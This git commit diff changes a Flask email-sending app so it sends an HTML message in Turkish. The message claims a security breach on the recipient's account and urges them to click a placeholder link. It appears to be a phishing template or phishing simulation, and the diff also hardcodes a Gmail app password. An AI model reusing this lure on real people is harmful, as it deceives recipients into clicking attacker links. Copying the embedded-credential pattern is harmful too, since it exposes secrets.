599f16b396cab2be1b4c68b01e6785a6f2606e40
mteksahin <mteksahin1@gmail.com>
2024-01-07 10:36:46 +0300

    Update app.py

--- app.py
+++ app.py
@@ -14,8 +14,7 @@ def send_email(sender, recipient, app_password, subject, content):
         message['From'] = sender
         message['To'] = recipient
         message['Subject'] = subject
-        message.attach(MIMEText(content, 'plain'))
-
+        message.attach(MIMEText(content , 'html'))
         
         with smtplib.SMTP("smtp.gmail.com", 587) as server:
             server.starttls()
@@ -39,7 +38,18 @@ def send_email_route():
         sender_app_password = "ltgh rovm xrrf mmiv"  # Uygulama özel şifrenizi buraya ekleyin
         recipient_email = data.get('recipientEmail')
         email_subject = "Hesabınıza yakın zamanda erişim denendi."
-        email_content = "Eğer bunu yapan siz değilseniz, lütfen aşağıdaki linkten bağlantıya tıklayın:"
+        email_content = """
+            <html>
+            <body>
+                <p>Sayın [Alıcı Adı],</p>
+                <p> Üzgün bir şekilde size bildirmeliyiz ki hesabınızla ilgili olarak yakın zamanda güvenlik ihlali tespit edilmiştir.</p>
+                <p> Lütfen bu durumu kontrol etmek ve gereken önlemleri almak adına aşağıdaki bağlantıya tıklayın:</p>
+                <p> <a href="https://www.ornek.com/guvenlik-onlemleri" target="_blank" style="color: #0000FF; text-decoration: none;">Güvenlik Önlemleri</a></p>
+                <p> Eğer bu işlemi siz yapmadıysanız, lütfen derhal müşteri hizmetlerimizle iletişime geçin.</p>
+                <p>     Saygılarımızla,<br/>[Firma Adı]</p>
+            </body>
+            </html>
+"""
 
         response = send_email(sender_email, recipient_email, sender_app_password, email_subject, email_content)
 
